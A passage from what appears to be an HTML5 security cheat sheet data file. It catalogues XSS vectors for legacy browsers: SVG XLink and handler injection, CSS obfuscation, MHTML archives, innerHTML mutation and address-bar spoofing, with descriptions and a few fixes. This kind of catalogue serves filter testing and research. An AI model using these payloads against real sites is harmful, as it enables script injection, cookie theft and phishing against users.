        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="%js_uri_alert%"><rect width="1000" height="1000" fill="white"/></a>\n</svg>',        
        'description': {
            'en' : 'Browsers that support SVG, forced to support XLink. The parameter of the attribute "xlink:actuate" for "a" tag is fixed - "onRequest".',
            'ja' : '',
            'ru' : 'Браузеры, которые поддерживают SVG, вынуждены поддерживать и XLink, поскольку таким образом реализуются почти все связи. Параметр атрибута "xlink:actuate" тега "a" является фиксированным - "onRequest".',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/linking.html', 'http://www.w3.org/TR/SVGTiny12/linking.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        }, 
        'browsers'   : {
            'chrome' : ['4.0', '5.0', '6.0'],
            'safari' : ['3.4', '4.x'],
	    'firefox': ['3.0', '3.5', '3.6', '3.7'],
	    'opera'  : ['9.x', '10.x']
        },
        'tags'       : ['xss', 'svg', 'passive', 'xlink', 'chrome', 'firefox', 'safari', 'opera'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 88 - SVG active JavaScript execution via XLink in Opera */
        'id'         : 88,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG active JavaScript execution via XLink in Opera',
            'ja' : '',
            'ru' : 'Активный скриптинг в SVG с помощью XLink для Opera',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<foreignObject xlink:href="%js_uri_alert%"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns=\'http://www.w3.org/1999/xhtml\'%3E%js_alert%%3C/script%3E"/>\n</svg>',        
        'description': {
            'en' : 'The content of the xml-links will automatically be included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-tags.',
            'ja' : '',
            'ru' : 'Содержимое xml-ссылки автоматически включается в текущий документ. Сочетание предустановленных параметров "onLoad" атрибута "xlink:actuate" и "embed" атрибута "xlink:show" образует потенциально небезопасные SVG-теги.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/attindex.html', 'http://www.w3.org/TR/SVGTiny12/attributeTable.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
	    'opera'  : ['9.x', '10.x']
        },
        'tags'       : ['xss', 'svg', 'active', 'xlink', 'opera'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 89 - SVG event handler injection via "set" and "animate" */
        'id'         : 89,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG event handler injection via "set" and "animate"',
            'ja' : '',
            'ru' : 'Инъекция обработчика события в SVG с помощью анимирования',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<set attributeName="onmouseover" to="%js_alert%"/>\n<animate attributeName="onunload" to="%js_alert%"/>\n</svg>',        
        'description': {
            'en' : 'Google Chrome and Safari support binding an event handler using the attributes "set" or "animate". The attribute value is the actually bound event while the "to" attribute value holds the payload.',
            'ja' : '',
            'ru' : 'Google Chrome и Safari поддерживают привязку обработчика события с использованием элементов "set" или "animate".',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG11/animate.html', 'http://www.w3.org/TR/SVGMobile12/animate.html', '#24', '#28'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['4.0', '5.0', '6.0'],
            'safari' : ['3.4', '4.x'],
        },
        'tags'       : ['xss', 'svg', 'event', 'safari', 'chrome'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 90 - SVG images containing XML data - with disabled JavaScript */
        'id'         : 90,
        'category'   : 'css', 
        'name'       : {
            'en' : 'SVG images containing XML data - with disabled JavaScript',
            'ja' : '',
            'ru' : 'SVG-изображение это такой же XML-документ, но с выключенным javascript',
            'de' : ''
        },
        'data'       : '<div style=content:url(%svg_path_2%)></div>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'samedomain'    : '1',            
            'path'          : 'http://heideri.ch/jso/test2.svg',
            'name'          : 'test2.svg',
            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
        },
        'description': {
            'en' : 'Opera supports the CSS property "content" for style attributes. The SVG image can contain SVG as well as HTML code. The example shows how a <FORM> tag can be used to trick the user into clicking a button and thus executing JavaScript. The same works for SVG files embedded via <IMG> tags.',
            'ja' : '',
            'ru' : 'Opera поддерживает CSS-свойство "content" в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег. Такой же эффект (а именно вставка ифрейма на страницу) происходит при вставке SVG-изображения через тег "img".',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
	    'opera'  : ['10.x']
        },
        'tags'       : ['xss', 'svg', 'css', 'opera', 'content', 'form'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 91 - Using "attr()" for CSS attack obfuscation */
        'id'         : 91,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Using "attr()" for CSS attack obfuscation',
            'ja' : '',
            'ru' : 'Использование "attr()"',
            'de' : ''
        },
        'data'       : '<div x="javasc&#x0Aript:%js_alert%" style=-o-link:attr(x);-o-link-source:current>X',        
        'description': {
            'en' : 'Opera supports "attr()" to access attribute values via CSS. Combining that with "-o-link-source" might help bypassing filters.',
            'ja' : '',
            'ru' : 'Opera поддерживает "attr()" в качестве значения свойства "-o-link-source". Эта особенность может быть использована для обхода фильтров.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['9.x', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'css', 'opera', 'trick', 'attr'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 92 - Breaking the functional notation on IE */
        'id'         : 92,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking the functional notation on IE ',
            'ja' : '',
            'ru' : 'Способ разорвать функциональную нотацию в IE',
            'de' : ''
        },
        'data'       : '<!DOCTYPE>\n<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X',        
        'description': {
            'en' : 'To break the functional notation on IE "url()" can be used combined with a following whitespace - then followed by any non-whitespace character.',
            'ja' : '',
            'ru' : 'В качестве прерывателя функциональной нотации "url()" может быть использована комбинация из любого пробельного символа, за которым следует любой непробельный символ.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0']
        },
        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'notation'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 93 - Multiple CSS "url()" values in IE 6 */
        'id'         : 93,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Multiple CSS "url()" values in IE 6',
            'ja' : '',
            'ru' : 'Множественный "url()" в IE 6',
            'de' : ''
        },
        'data'       : '<div style="list-style:url(http://foo.f)\\20url(%js_uri_alert%);">X',        
        'description': {
            'en' : 'Internet Explorer supports multiple "url()" values all of which can contain payload. The delimiter between the "url()" values should be a space character ("\\x20").',
            'ja' : '',
            'ru' : 'IE поддерживает множественный "url()", который может содержать "полезную нагрузку". Разделителем "url()" может быть только символ пробела (\\x20).',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure in case the user is allowed to submit CSS it is being filtered and whitelisted correctly to avoid attacks via multiple backgrounds.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'browsers'   : {
            'internet explorer': ['6.0']
        },
        'tags'       : ['xss', 'css', 'internet explorer', 'trick', 'url'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 94 - Using SVG element <handler> */
        'id'         : 94,
        'category'   : 'svg',
        'name'       : {
            'en' : 'Using SVG element <handler>',
            'ja' : '',
            'ru' : 'Использование SVG элемента <handler>',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">%js_alert%</handler>\n</svg>',        
        'description': {
            'en' : 'Specification SVG Tiny 1.2 provides an element <handler>, which is a "bridge" between SVG and XML-events. This element can contain regular JavaScript.',
            'ja' : '',
            'ru' : 'Спецификацией SVG Tiny 1.2 предусмотрен элемент <handler>, который является связующим звеном между SVG и XML-events. Этот элемент может заключать в себе обычный JavaScript код.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html#HandlerElement', 'http://www.w3.org/TR/xml-events/', '#84', '#85'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'browsers'   : {
	    'opera'  : ['10.x', '10.5', '10.6', 'mobile']
        },
        'tags'       : ['xss', 'svg', 'opera', 'XML-events'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 95 - Using SVG element <feImage> and data URIs */
        'id'         : 95,
        'category'   : 'svg',
        'name'       : {
            'en' : 'Using SVG element <feImage> and data URIs',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\r\n<feImage xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D" />\r\n</svg>',        
        'description': {
            'en' : 'SVG allows using filter effects to be applied on arbitrary visible SVG elements. The feImage filter allows inclusion of other files - as well as data URIs. With a maliciuosly crafted data URI it\'s possible to execute JavaScript without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVG/filters.html'],
        'howtofix'   : {
            'en' : 'Make sure that user submitted SVG data and SVG files are treated as XML documents - not as images. The nature of SVG allows to include almost arbitrary XML data including JavaScript leading to XSS or worse.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'browsers'   : {
        'opera'  : ['10.x', '10.5', '10.6', 'mobile']
        },
        'tags'       : ['xss', 'svg', 'opera', 'filter effects', 'feimage'],
        'reporter'   : '.mario'
    },
    { /* ID 96 - JavaScript execution via MHTML-scheme */
        'id'         : 96,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via MHTML-scheme',
            'ja' : '',
            'ru' : 'Исполнение Javascript с использованием MHTML-схемы.',
            'de' : ''
        },
        'data'       : 'mhtml:http://heideri.ch/jso/test.html!xss.html\nmhtml:http://heideri.ch/jso/test.gif!xss.html',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.html',
            'name'          : 'test.html',
            'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--\n</body>\n</html>'
        },
        'description': {
	    'en' : 'Any content including images (for example GIF comments) may be considered as web-archive in case user input is allowed before the first two new lines. Using this vector all sites that do not contain two new lines in the source code and allows users to insert new line are vulnerable - as well as all sites that allow users to upload images without post-upload conversion etc. A link to this web-archives can be specified via <IFRAME> or location.href and comparable.',
            'ja' : '',
            'ru' : 'Любой формат, включая изображения (остаются неиспорченными, поскольку содержат текстовые секторы), может рассматриваться в качестве веб-архива, если пользователь имеет возможность влиять на исходный код сайта до первой пустой строки, или первых двух переводов строк. Этим вектором уязвимы все сайты, которые не содержат пробелов в исходном коде и позволяют пользователю вставлять новые строки, а также все сайты, которые позволяют пользователям загружать неконвертируемые изображения и т.п. Ссылка на архив может быть указана в теге <IFRAME> или с помощью location, или как-либо ещё.',
            'de' : ''
        },
        'urls'    : ['http://en.wikipedia.org/wiki/MHTML'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': [
                '5.0','6.0', '7.0', '8.0'
            ]
        },
        'tags'       : ['xss', 'internet explorer', 'archive', 'mhtml'],
        'reporter'   : 'bolk, LeverOne'
    },
    { /* ID 97 - XSS using "xmlns" attribute in custom tag when copying innerHTML (2) */
        'id'         : 97,
        'category'   : 'html', 
        'name'       : {
            'en' : 'XSS using "xmlns" attribute in custom tag when copying innerHTML (2)',
            'ja' : '',
            'ru' : 'XSS с использованием атрибута xmlns в сочетании с пользовательским (custom) тегом при копировании с помощью innerHTML (2)',
            'de' : ''
        },
        'data'       : '<div id=d><x xmlns="><iframe onload=%js_alert%"></div>\n<script>d.innerHTML=d.innerHTML</script>',
        'description': {
	    'en' : 'Internet Explorer incorrectly analyzes the attribute "xmlns" in custom tags when copying innerHTML - its parameter is added to the tag <?XML:NAMESPACE> without delimiters.',
            'ja' : '',
            'ru' : 'Internet Explorer неправильно анализирует атибут xmlns в пользовательских тегах при копировании с помощью innerHTML: параметр этого атрибута добавляется в тег <?XML:NAMESPACE> без оганичителей.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': [
                '6.0', '7.0', '8.0'
            ]
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 98 - Style injection when copying innerHTML (3) */
        'id'         : 98,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Style injection when copying innerHTML (3)',
            'ja' : '',
            'ru' : 'Стилевая инъекция при копировании с помощью innerHTML (3)',
            'de' : ''
        },
        'data'       : '<div id=d><div style="font-family:\'sans\\27\\3B color\\3Ared\\3B\'">X</div></div>\n<script>with(document.getElementById("d"))innerHTML=innerHTML</script>',
        'description': {
	    'en' : 'The example shows that Internet Explorer and Mozilla Firefox automaticaly decode CSS-encoding if the harmless markup is copied using innerHTML.',
            'ja' : '',
            'ru' : 'Пример показывает, как Internet Explorer and Mozilla Firefox автоматически декодируют CSS-кодировку в случае, если на первый взгляд безопасная разметка копируется с помощью innerHTML.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': [
                '6.0', '7.0', '8.0'
            ],
            'firefox': [
                '2.x', '3.x'
            ] 
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml', 'css'],
        'reporter'   : 'sdc'
    },
    { /* ID 99 - Using comments to obfuscate styles */
        'id'         : 99,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Using comments to obfuscate styles',
            'ja' : '',
            'ru' : 'Использование комментариев для обфускации стилей',
            'de' : ''
        },
        'data'       : 'XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>',
        'description': {
	    'en' : 'All browsers allow to use CSS-comments before and after the properties and values. In addition, Internet Explorer allows to use comments in values. Also it\'s possible for Internet Explorer and Safari to obfuscate comment inside the tag <STYLE> via unencoded null character.',
            'ja' : '',
            'ru' : 'Все браузеры позволяют использовать CSS-комментарии до и после свойств и их значений. Кроме того, Internet Explorer позволяет использовать комментарии в значениях свойств. Также в Internet Explorer и Safari в теге <STYLE> воспринимается комментарий, обфусцированный с помощью незакодированного нулевого символа.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0'],
            'firefox': ['3.x', '4.x'],
            'opera'  : ['9.x', '10.x', 'mobile'],
            'chrome' : ['4.0', '5.0', '6.0'],
            'safari' : ['3.x', '4.x', '5.x'],
        },
        'tags'       : ['trick', 'css', 'obfuscation', 'internet explorer', 'firefox', 'opera', 'chrome', 'safari', 'comment'],
        'reporter'   : 'Roman Ivanov, LeverOne'
    },
    { /* ID 100 - HTML separators and ignored characters */
        'id'         : 100,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML separators and ignored characters',
            'ja' : '',
            'ru' : 'Разделители и игнорируемые символы в HTML',
            'de' : ''
        },
        'data'       : '<img[a][b][c]src[d]=x[e]onerror=[f]"%js_alert%">',
        'description': {
	    'en' : '[a] Characters* ignored after tag names (and not accepted as tag name/attribute separators).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Characters accepted as tag name/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Characters ignored before attributes (and not accepted as parameter/attribute separators).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Characters ignored between attribute name and equals sign.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Characters accepted as parameter/attribute separators.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] Characters ignored between equals sign and parameter.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* These are given in decimal codes.\n** Null character in Safari is a divider (only the left part of the tag name or attribute name still valid).',
            'ja' : '',
            'ru' : '[a] Символы*, игнорируемые после имени тега (и не являющиеся при этом разделителями имени тега и атрибута).\n\nInternet Explorer, Safari** : 0\nSafari : 47\nFirefox 3.x : 11,12\n\n[b] Символы, воспринимаемые в качестве разделителей имени тега и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nFirefox, Internet Explorer, Google Chrome, Opera : 47\nInternet Explorer, Safari: 11\n\n[c] Символы, игнорируемые перед атрибутом (и не являющиеся при этом разделителями параметра и атрибута).\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 47\nFirefox 3.x, Safari : 34,39\nInternet Explorer : 0\n\n[d] Симолы, игнорируемые между именем атрибута и знаком равенства.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 0,11\nSafari : 47\n\n[e] Символы, воспринимаемые в качестве разделителей параметра и атрибута.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\n\n[f] символы, игнорируемые между знаком равенства и параметром.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,13,32\nFirefox 4.x, Internet Explorer, Safari, Google Chrome, Opera : 12\nSafari, Internet Explorer : 11\nInternet Explorer : 0\n\n* Приведены в десятичных кодах.\n** Нулевой символ в Safari - это символ-отсекатель (остаётся действительной только левая часть имени тега или параметра).',
            'de' : ''
        },
        'urls'    : ['http://docs.google.com/Doc?docid=0ASCeV1AnDNdWZGQ3eDVzbXdfMTZoZGQzNGdneg'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0'],
            'firefox': ['3.x', '4.x'],
            'opera'  : ['9.x', '10.x', 'mobile'],
            'chrome' : ['5.0', '6.0'],
            'safari' : ['4.x', '5.x'],
        },
        'tags'       : ['xss', 'internet explorer', 'firefox','opera', 'chrome', 'safari', 'separator'],
        'reporter'   : 'hasegawayosuke, LeverOne, .mario, RSnake, '
    },
    { /* ID 101 -  Characters ignored in the URI (Safari and Google Chrome) */
        'id'         : 101,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Characters ignored in the URI (Safari and Google Chrome)',
            'ja' : '',
            'ru' : 'Символы, игнорируемые в URI (Safari and Google Chrome)',
            'de' : ''
        },
        'data'       : '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:%js_alert%>XXX</a>',
        'description': {
	    'en' : 'This example shows that Google Chrome and Safari ignore the following characters in the URI (excluding 9,10,13) : 1-8,11,12. Also Safari ignores in the URI unencoded null character.',
            'ja' : '',
            'ru' : 'Пример как бы намекает, что Google Chrome и Safari помимо символов с десятичным кодом 9,10,13, игнорируемых в URI всеми браузерами, также игнорирует символы 1-8,11,12. Кроме того, Safari игнорирует в URI незакодированный нулевой символ.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['5.0', '6.0'],
            'safari' : ['4.x', '5.x'],
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'chrome', 'safari'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 102 - Forced plaintext via unbalanced quotes in Internet Explorer */
        'id'         : 102,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Forced plaintext via unbalanced quotes in Internet Explorer',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<img src="x` `<script>%js_alert%</script>"` `>',
        'description': {
            'en' : 'Internet Explorer treats any tag as plaintext in case the attribute delimiters are unbalanced - in this example caused by the ` `. In unbalanced quotes appear inside or outside an attributes - preceded by an arbitrary character but the equals sign - the usage of HTML inside attributes is possible and the content will be rendered as regular HTML. The problem has been reported and will be taken care of in later versions of the Internet Explorer.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer' : ['6.0', '7.0', '8.0'],
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'parser', 'backtick', 'plaintext'],
        'reporter'   : '.mario, hasegawayosuke'
    },
    { /* ID 103 - Spoofing the address bar information with history.pushState() */
        'id'         : 103,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'Spoofing the address bar information with history.pushState()',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<script>history.pushState(0,0,\'/i/am/somewhere_else\');</script>',
        'description': {
            'en' : 'The history.pushState() and history.replaceState() API allows to create and modify the user\'s history. An attacker can use this feature to change the information displayed in the address bar as well as the location DOM object and thus initiate phishing attacks or obfuscate bad intentions. The information shown in the address bar cannot be trusted anymore as soon as an attacker or a malicious website execute JavaScript.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/history.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['3.6', '4.0'],
            'chrome' : ['6.0'],
        },
        'tags'       : ['xss', 'javascript', 'spoofing', 'history', 'phishing'],
        'reporter'   : '.mario'
    },
    { /* ID 104 - Executing JavaScript in SVG Tiny 1.2 without user interaction */
        'id'         : 104,
        'category'   : 'svg', 
        'name'       : {
            'en' : ' Executing JavaScript in SVG Tiny 1.2 without user interaction',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" id="foo">\r\n<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E %js_alert% %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>\r\n</svg>',
        'description': {
            'en' : 'Opera - providing advanced support for SVG Tiny 1.2 targeting mobile devices - allows to execute JavaScript without user interaction via arbitrary tags. The tag is being applied with a handler pointing to a data URI containing the actual handler. Important is the hash at the end of the data URI to identify the corrrect handler. It is also possible to refer to an element contained in the SVG by its ID or an external resource.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/SVGMobile12/script.html', 'http://www.w3.org/TR/2003/REC-xml-events-20031014/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera' : ['10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'svg', 'tinysvg', 'listener', 'xml', 'events'],
        'reporter'   : '.mario'
    }
]